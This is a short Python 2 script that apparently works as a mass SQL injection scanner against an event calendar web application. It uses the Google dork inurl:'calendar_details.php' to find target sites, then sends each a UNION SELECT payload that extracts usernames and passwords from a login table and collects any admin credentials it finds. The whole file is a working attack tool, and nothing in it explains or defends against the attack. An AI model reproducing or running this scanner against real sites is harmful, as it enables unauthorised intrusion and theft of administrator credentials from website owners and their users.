#coded by p1mps 

import  urllib2,httplib,sys,re

def StripTags(text):
     finished = 0
     while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]
                 finished = 0
     return text




def tester(victim):

     usernames_passes = []
     
     print "testing " + victim
     sql = "-26+union+select+0,0,concat(user_name,0x3a,user_pass),0,0,0,0,0,0,0+from+login--"
     try:
          print "[+] setting proxy"
          proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
          opener = urllib2.build_opener(proxy_handler)
     except:
          print "Proxy:",proxy,"- Failed"
          


     try:
          req = urllib2.Request("http://"+victim+"?id="+sql)
          req.add_header('User-Agent', "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4")
          opener = urllib2.build_opener()
          conn = urllib2.urlopen(req)
          st = conn.read()
          username_pass = re.findall("admin:[a-zA-Z|\d]+",st)
          if len(username_pass) > 0:
               usernames_passes.append(username_pass)
               print "found:" + "http://"+victim+"?="+sql
     except:
          print "error"
     return usernames_passes


def geturls(query,num):
     print "[+] getting urls"
     counter =  10
     urls = []
     while counter < int(num):
          url = 'http://www.google.com/search?hl=en&q='+query+'&hl=en&lr=&start='+repr(counter)+'&sa=N'
          #url = "http://search.lycos.com/?query="+query+"&page="+repr(counter)
          opener = urllib2.build_opener(url)
          opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
          data = opener.open(url).read()
          print data
          hosts = re.findall(('\w+\.[\w\.\-/]*\.\w+'),StripTags(data))
          #hosts = re.findall('<span class=\"?grnLnk small\"?>http:\/\/(.+?)\/',data)
          for x in hosts:
               if x.find('www') != -1:
                    x = x[x.find('www'):]
                    if x not in urls and re.search("google", x) == None:
                         urls.append(x)
          counter += 10
     for url in urls:

          print url

     return urls


if len(sys.argv) <= 1:
    print  "Usage: ./eventcalendar_scanner.py -p proxy -n num" 
    sys.exit(1)

for arg in sys.argv:
     if arg == "-p":
         proxy =  sys.argv[2]
     if arg == "-n":
         num =  sys.argv[4]


urls = geturls("inurl:'calendar_details.php'",num)


#pass

for url in urls:
     tester(url)
